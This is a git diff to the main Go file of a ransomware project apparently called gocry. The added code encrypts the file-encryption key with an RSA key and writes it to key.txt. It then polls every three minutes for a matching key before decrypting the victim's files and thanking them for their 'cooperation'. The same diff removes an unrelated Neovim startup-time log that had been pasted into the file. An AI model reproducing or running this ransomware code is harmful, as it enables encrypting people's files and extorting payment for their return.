@@ -1,13 +1,19 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha1"
+	"crypto/x509"
+	"encoding/pem"
 	"io"
 	"io/ioutil"
 	"log"
 	"os"
+	"time"
 
 	"github.com/joho/godotenv"
 	"github.com/nireo/gocry/utils"
@@ -156,108 +162,52 @@ func main() {
 		log.Fatal(err)
 	}
 
-	fmt.Println(string(ransomware.key))
+	// encrypt the key using the rsa public key
+	pemd, err := ioutil.ReadFile("private.pem")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	block, _ := pem.Decode(pemd)
+	if block == nil {
+		log.Fatal("bad key data: not PEM-encoded")
+	}
+
+	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+		log.Fatalf("unknown key type: %q, want %q", got, want)
+	}
+
+	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		log.Fatalf("bad private key: %s", err)
+	}
+
+	out, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, &priv.PublicKey, ransomware.key, []byte("key.txt"))
+	if err != nil {
+		log.Fatalf("error while encrypting key content: %s", err)
+	}
+
+	if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", out, 0600); err != nil {
+		log.Fatalf("write output: %s", err)
+	}
+
+	// Setup a infinite loop, which checks the valid key.
+	for {
+		fmt.Println("Checking key file...")
+		key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
+		if err != nil {
+			time.Sleep(time.Minute * 3)
+			continue
+		}
+
+		// check if the keys match
+		if bytes.Equal(key, ransomware.key) {
+			// The ransom has been paid so decrypt the files..
+			ransomware.decryptDirectory(ransomware.rootDir)
+			fmt.Println("Thank you for your cooperation!")
+			break
+		}
+
+		time.Sleep(time.Minute * 3)
+	}
 }
-
-
-times in msec
- clock   self+sourced   self:  sourced script
- clock   elapsed:              other lines
-
-000.003  000.003: --- NVIM STARTING ---
-000.204  000.201: locale set
-000.382  000.178: inits 1
-000.391  000.009: window checked
-000.394  000.002: parsing arguments
-000.425  000.031: expanding arguments
-000.453  000.028: inits 2
-000.820  000.367: init highlight
-000.879  000.059: waiting for UI
-001.566  000.687: done waiting for UI
-001.585  000.019: initialized screen early for UI
-001.648  000.012  000.012: sourcing /usr/share/nvim/archlinux.vim
-001.654  000.043  000.031: sourcing /etc/xdg//nvim/sysinit.vim
-002.966  001.245  001.245: sourcing /home/eemil/.local/share/nvim/site/autoload/plug.vim
-010.916  000.015  000.015: sourcing /home/eemil/.vim/plugged/vimtex/ftdetect/tex.vim
-011.092  000.143  000.143: sourcing /home/eemil/.vim/plugged/vim-go/ftdetect/gofiletype.vim
-011.219  000.010  000.010: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/css.vim
-011.239  000.010  000.010: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/graphql.vim
-011.256  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/html.vim
-011.273  000.008  000.008: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/javascript.vim
-011.289  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/json.vim
-011.308  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/less.vim
-011.324  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/lua.vim
-011.348  000.015  000.015: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/markdown.vim
-011.365  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/php.vim
-011.382  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/ruby.vim
-011.406  000.015  000.015: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/scss.vim
-011.426  000.011  000.011: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/typescript.vim
-011.443  000.008  000.008: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/vue.vim
-011.459  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/xml.vim
-011.478  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/yaml.vim
-011.518  000.008  000.008: sourcing /home/eemil/.vim/plugged/yats.vim/ftdetect/typescript.vim
-011.535  000.007  000.007: sourcing /home/eemil/.vim/plugged/yats.vim/ftdetect/typescriptreact.vim
-011.571  000.011  000.011: sourcing /home/eemil/.vim/plugged/typescript-vim/ftdetect/typescript.vim
-011.620  000.021  000.021: sourcing /home/eemil/.vim/plugged/rust.vim/ftdetect/rust.vim
-011.697  005.409  005.068: sourcing /usr/share/nvim/runtime/filetype.vim
-011.793  000.021  000.021: sourcing /usr/share/nvim/runtime/ftplugin.vim
-011.884  000.019  000.019: sourcing /usr/share/nvim/runtime/indent.vim
-012.240  000.177  000.177: sourcing /usr/share/nvim/runtime/syntax/syncolor.vim
-012.309  000.317  000.140: sourcing /usr/share/nvim/runtime/syntax/synload.vim
-012.326  000.407  000.090: sourcing /usr/share/nvim/runtime/syntax/syntax.vim
-012.398  000.007  000.007: sourcing /usr/share/nvim/runtime/filetype.vim
-012.471  000.005  000.005: sourcing /usr/share/nvim/runtime/ftplugin.vim
-012.542  000.005  000.005: sourcing /usr/share/nvim/runtime/indent.vim
-012.722  000.152  000.152: sourcing /usr/share/nvim/runtime/syntax/nosyntax.vim
-014.307  000.110  000.110: sourcing /usr/share/nvim/runtime/syntax/syncolor.vim
-015.054  002.010  001.900: sourcing /home/eemil/.vim/plugged/vim-monotone/colors/monotone.vim
-015.530  013.857  004.577: sourcing /home/eemil/.config/nvim/init.vim
-015.534  000.049: sourcing vimrc file(s)
-015.755  000.053  000.053: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/rpc.vim
-016.164  000.376  000.376: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/util.vim
-016.379  000.102  000.102: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/client.vim
-019.131  003.506  002.975: sourcing /home/eemil/.vim/plugged/coc.nvim/plugin/coc.vim
-019.432  000.095  000.095: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter/utility.vim
-019.657  000.079  000.079: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter/highlight.vim
-020.599  001.373  001.199: sourcing /home/eemil/.vim/plugged/vim-gitgutter/plugin/gitgutter.vim
-020.926  000.272  000.272: sourcing /home/eemil/.vim/plugged/vim-rooter/plugin/rooter.vim
-021.368  000.393  000.393: sourcing /home/eemil/.vim/plugged/fzf/plugin/fzf.vim
-021.945  000.524  000.524: sourcing /home/eemil/.vim/plugged/fzf.vim/plugin/fzf.vim
-024.680  002.683  002.683: sourcing /home/eemil/.vim/plugged/nerdcommenter/plugin/NERD_commenter.vim
-025.040  000.282  000.282: sourcing /home/eemil/.vim/plugged/vim-clang-format/plugin/clang_format.vim
-025.431  000.253  000.253: sourcing /home/eemil/.vim/plugged/vim-go/autoload/go/config.vim
-025.898  000.232  000.232: sourcing /home/eemil/.vim/plugged/vim-go/autoload/go/util.vim
-025.920  000.823  000.338: sourcing /home/eemil/.vim/plugged/vim-go/plugin/go.vim
-026.204  000.233  000.233: sourcing /home/eemil/.vim/plugged/vim-prettier/plugin/prettier.vim
-026.321  000.048  000.048: sourcing /home/eemil/.vim/plugged/rust.vim/plugin/cargo.vim
-026.358  000.024  000.024: sourcing /home/eemil/.vim/plugged/rust.vim/plugin/rust.vim
-026.674  000.137  000.137: sourcing /usr/share/nvim/runtime/plugin/gzip.vim
-026.705  000.008  000.008: sourcing /usr/share/nvim/runtime/plugin/health.vim
-026.776  000.058  000.058: sourcing /usr/share/nvim/runtime/plugin/man.vim
-027.193  000.181  000.181: sourcing /usr/share/nvim/runtime/pack/dist/opt/matchit/plugin/matchit.vim
-027.221  000.431  000.250: sourcing /usr/share/nvim/runtime/plugin/matchit.vim
-027.243  000.010  000.010: sourcing /usr/share/nvim/runtime/plugin/matchparen.vim
-027.593  000.339  000.339: sourcing /usr/share/nvim/runtime/plugin/netrwPlugin.vim
-027.718  000.101  000.101: sourcing /usr/share/nvim/runtime/plugin/rplugin.vim
-027.870  000.132  000.132: sourcing /usr/share/nvim/runtime/plugin/shada.vim
-027.927  000.022  000.022: sourcing /usr/share/nvim/runtime/plugin/spellfile.vim
-028.063  000.117  000.117: sourcing /usr/share/nvim/runtime/plugin/tarPlugin.vim
-028.142  000.060  000.060: sourcing /usr/share/nvim/runtime/plugin/tohtml.vim
-028.175  000.015  000.015: sourcing /usr/share/nvim/runtime/plugin/tutor.vim
-028.315  000.124  000.124: sourcing /usr/share/nvim/runtime/plugin/zipPlugin.vim
-028.333  001.082: loading plugins
-028.377  000.043: loading packages
-028.422  000.046: loading after plugins
-028.438  000.016: inits 3
-029.970  001.531: reading ShaDa
-030.188  000.218: opening buffers
-030.390  000.161  000.161: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter.vim
-030.778  000.430: BufEnter autocommands
-030.781  000.003: editing files in windows
-030.918  000.136: VimEnter autocommands
-030.920  000.002: UIEnter autocommands
-031.233  000.231  000.231: sourcing /usr/share/nvim/runtime/autoload/provider/clipboard.vim
-031.239  000.088: before starting main loop
-032.263  000.998  000.998: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/float.vim
-041.140  008.903: first screen update
-041.145  000.005: --- NVIM STARTED ---
